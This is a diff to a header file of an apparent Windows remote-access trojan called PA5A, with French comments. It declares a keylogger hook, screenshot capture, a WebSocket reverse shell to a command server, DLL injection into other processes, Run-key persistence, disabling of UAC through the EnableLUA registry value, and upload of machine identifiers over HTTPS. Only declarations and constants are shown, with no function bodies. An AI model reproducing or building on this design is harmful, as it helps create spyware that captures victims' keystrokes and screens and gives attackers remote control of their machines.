@@ -24,18 +24,11 @@
 #include <shlwapi.h>
 #include <gdiplus.h>
 #include <tlhelp32.h>
-
 #include "../resources/resource.h"
 
+#pragma warning(disable:4996)
 
 EXTERN_C_START
-//BOOL WINAPI SaveBitmap(LPCWSTR wPath);
-
-#pragma warning(disable:4996) // replace strcpy
-
-static struct lws_context* context;
-static CRITICAL_SECTION lockFile;
-#define BUFSIZE 4096
 
 /******************************CONFIGURATION******************************/
 //Pour afficher les informations de debogage
@@ -43,8 +36,10 @@ static CRITICAL_SECTION lockFile;
 
 #define DATA_FOLDER_A		"C:\\ProgramData\\PA5A\\"
 #define DATA_FOLDER_W		L"C:\\ProgramData\\PA5A\\"
-#define EXECUTABLE_FILE_A	"PA5A.exe"
-#define EXECUTABLE_FILE_W	L"PA5A.exe"
+#define APP_NAME_A			"PA5A"
+#define APP_NAME_W			L"PA5A"
+#define EXE_FILE_A			"PA5A.exe"
+#define EXE_FILE_W			L"PA5A.exe"
 #define DLL_FILE_A			"PA5A.dll"
 #define DLL_FILE_W			L"PA5A.dll"
 #define SCREENSHOT_FILE_W	L"screenshot.jpeg"
@@ -62,13 +57,109 @@ static CRITICAL_SECTION lockFile;
 #define PATH_SIZE			2048
 #define URL_SIZE			4096
 #define UUID_SIZE			256
-#define COMPUTER_NAME_SIZE	256
+#define INFORMATION_SIZE	4096
+#define WS_SERVER_URL		"wss://" SERVER_NAME_A REVERSE_SHELL_WS_A
 
-/******************************REVERSE SHELL******************************/
-#define WS_SERVER_URL "wss://" SERVER_NAME_A REVERSE_SHELL_WS_A
 
-//Structure for reverse shell
-struct WebSocketData
+/********************************************************************************************************************************/
+// http.cpp
+typedef struct Commands
+{
+	BOOL keylogs;
+	BOOL screenshot;
+	BOOL reverseShell;
+} Commands;
+
+VOID GenerateBoundary(LPSTR buffer, SIZE_T size);
+Commands GetCommands(LPCSTR server, DWORD port);
+BOOL SendJsonDataByHttps(LPCSTR server, DWORD port, LPCSTR url, LPCSTR method, LPCSTR userAgent, LPCSTR jsonData);
+
+/********************************************************************************************************************************/
+// informations.cpp
+typedef struct _dmi_header
+{
+	BYTE type;
+	BYTE length;
+	WORD handle;
+} dmi_header;
+
+typedef struct _RawSMBIOSData
+{
+	BYTE    Used20CallingMethod;
+	BYTE    SMBIOSMajorVersion;
+	BYTE    SMBIOSMinorVersion;
+	BYTE    DmiRevision;
+	DWORD   Length;
+	BYTE    SMBIOSTableData[65536];
+} RawSMBIOSData;
+
+typedef enum InformationType
+{
+	COMPUTER_NAME,
+	MANUFACTURER,
+	PRODUCT_NAME,
+	SERIAL_NUMBER,
+	FAMILY,
+	BIOS_UUID
+} InformationType;
+
+BOOL dmi_system_uuid(const PBYTE biosTableData, SHORT version, LPSTR uuid);
+VOID dmi_string(const dmi_header* header, BYTE index, LPSTR destination, SIZE_T maxLength);
+BOOL GetInformation(LPSTR destination, DWORD maxLength, InformationType informationType);
+cJSON* CreateInformationsJsonObject();
+BOOL SendClientInformations();
+
+/********************************************************************************************************************************/
+// injection.cpp
+BOOL WritePa5aDll();
+BOOL inject(DWORD processId);
+DWORD GetProcessIdFormProcessName(LPCWSTR processName);
+DWORD WINAPI ThreadInjector();
+
+/********************************************************************************************************************************/
+// keylogger.cpp
+LRESULT WINAPI HookProc(int code, WPARAM wParam, LPARAM lParam);
+VOID WriteLogs(PWCHAR logsUnicode, PWCHAR appNameUnicode, PWCHAR pathUnicode);
+cJSON* CreateJsonLogsObject(PCHAR logs, PCHAR app, PCHAR path);
+VOID WriteJsonObjectLogs(cJSON* newJsonObject);
+VOID SendKeylogs();
+DWORD WINAPI ThreadKeylogger();
+
+/********************************************************************************************************************************/
+// LeagueOfLegends.cpp
+LRESULT CALLBACK leagueOfLengendsWindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
+DWORD ThreadLeagueOfLegends();
+
+/********************************************************************************************************************************/
+// main.cpp
+INT WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ INT nCmdShow);
+
+/********************************************************************************************************************************/
+// registry.cpp
+#define PERSISTENCE_REGISTRY_KEY_A "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
+#define PERSISTENCE_REGISTRY_KEY_W L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
+#define UAC_REGISTRY_KEY_A "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
+#define UAC_REGISTRY_KEY_W L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
+#define UAC_REGISTRY_VALUE_A "EnableLUA"
+#define UAC_REGISTRY_VALUE_W L"EnableLUA"
+
+BOOL SetRegistryKeyStringValue(HKEY hKey, LPCWSTR key, LPCWSTR name, LPCWSTR data);
+BOOL SetRegistryKeyDwordValue(HKEY hKey, LPCWSTR key, LPCWSTR name, DWORD data);
+BOOL SetPersistence();
+BOOL DisableUac();
+
+/********************************************************************************************************************************/
+// screenshot.cpp
+INT WINAPI GetEncoderClsid(LPCWSTR format, CLSID* pClsid);
+BOOL WINAPI SaveScreenshot(LPCWSTR filename);
+VOID SendScreenshot();
+
+/********************************************************************************************************************************/
+// shell.cpp
+static struct lws_context* context;
+#define BUFSIZE 4096
+
+typedef struct WebSocketData
 {
 	HANDLE hThreadRead;
 	HANDLE hChildStd_Input_Rd;
@@ -77,86 +168,29 @@ struct WebSocketData
 	HANDLE hChildStd_Output_Wr;
 	HANDLE hCmdProcess;
 	struct lws* socket;
-};
+} WebSocketData;
 
-//LeagueOfLegends.cpp
-DWORD ThreadLeagueOfLegends();
-
-//injector.cpp
-BOOL inject(DWORD processId);
-DWORD GetProcessIdFormProcessName(LPCWSTR processName);
-DWORD ThreadInjector();
-
-//registry.cpp
-BOOL SetRegistryKeyStringValue(LPCWSTR key, LPCWSTR name, LPCWSTR data);
-BOOL SetRegistryKeyDwordValue(LPCWSTR key, LPCWSTR name, DWORD data);
-BOOL SetPersistence();
-BOOL DisableUac();
-
-//shell.cpp
-DWORD WINAPI ThreadProc(HANDLE wsData);
 BOOL CreatePipes(struct WebSocketData* wsData);
-int CreateChildProcess(LPCWSTR processName, struct WebSocketData* wsData);
-BOOL WriteToPipe(char* command, struct WebSocketData* wsData);
-BOOL ReadFromPipe(struct WebSocketData* wsData, char* buffer, size_t length);
-void PrintError(char* text, int err);
+INT CreateChildProcess(LPCWSTR processName, WebSocketData* wsData);
+BOOL WriteToPipe(LPSTR command, WebSocketData* wsData);
+BOOL ReadFromPipe(WebSocketData* wsData, LPSTR buffer, SIZE_T length);
+VOID PrintError(LPSTR text, INT err);
+DWORD WINAPI ThreadProc(HANDLE wsData);
+DWORD WINAPI ThreadReverseShell();
 
-//ws.cpp
-BOOL WS_Connection();
-void send_data(struct mg_connection* sock, char* buffer);
-static void event_handler(struct mg_connection* c, int ev, void* ev_data, void* wsData);
-
-/******************************MAIN******************************/
-typedef struct Commands
-{
-	BOOL keylogs;
-	BOOL screenshot;
-	BOOL reverseShell;
-} Commands;
-
-/********************************************************************************************************************************************************/
-//main.cpp
-DWORD ThreadKeylogger();
-VOID SendKeylogs();
-VOID SendScreenshot();
-INT WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ INT nCmdShow);
-
-/********************************************************************************************************************************************************/
-//http.cpp
-VOID GenerateBoundary(LPSTR buffer, SIZE_T size);
-Commands GetCommands(LPCSTR server, DWORD port);
-BOOL SendJsonDataByHttps(LPCSTR server, DWORD port, LPCSTR url, LPCSTR method, LPCSTR userAgent, LPCSTR jsonData);
-cJSON* CreateInformationsJsonObject();
-BOOL SendClientInformations();
-/********************************************************************************************************************************************************/
-//Keylogger.cpp
-LRESULT WINAPI HookProc(int code, WPARAM wParam, LPARAM lParam);
-VOID WriteLogs(PWCHAR logsUnicode, PWCHAR appNameUnicode, PWCHAR pathUnicode);
-cJSON* CreateJsonLogsObject(PCHAR logs, PCHAR app, PCHAR path);
-VOID WriteJsonObjectLogs(cJSON* newJsonObject);
-/********************************************************************************************************************************************************/
-//screenshot.cpp
-INT WINAPI GetEncoderClsid(LPCWSTR format, CLSID* pClsid);
-BOOL WINAPI SaveScreenshot(LPCWSTR filename);
-/********************************************************************************************************************************************************/
-//utils.cpp
+/********************************************************************************************************************************/
+// utils.cpp
 VOID CreateConsole();
-
-//Obtenir un timestamp UNIX en secondes ou en millisecondes
 LONGLONG GetTimestamp(BOOL inMlliseconds);
-
 int gettimeofday(struct timeval* tp, struct timezone* tzp);
-
-//Obtenir un timestamp UNIX depuis une structure SYSTEMTIME
 LONGLONG SystemTimeToUnixTimestamp(SYSTEMTIME system_time);
-
-//Obtenir une structure SYSTEMTIME depuis un timestamp UNIX
 SYSTEMTIME UnixTimestampToSystemTime(LONGLONG timestamp);
-
-//Convertir une chaine de caractère unicode en UTF8
 PCHAR encode_UTF8(LPCWCHAR messageUTF16);
-/********************************************************************************************************************************************************/
-//uuid.cpp
-int GetUuid(char* uuid);
+
+/********************************************************************************************************************************/
+// ws.cpp
+static void connect_client(lws_sorted_usec_list_t* sul);
+static int callback_minimal(struct lws* socket, enum lws_callback_reasons reason, void* user, void* in, size_t len);
+BOOL WS_Connection();
 
 EXTERN_C_END
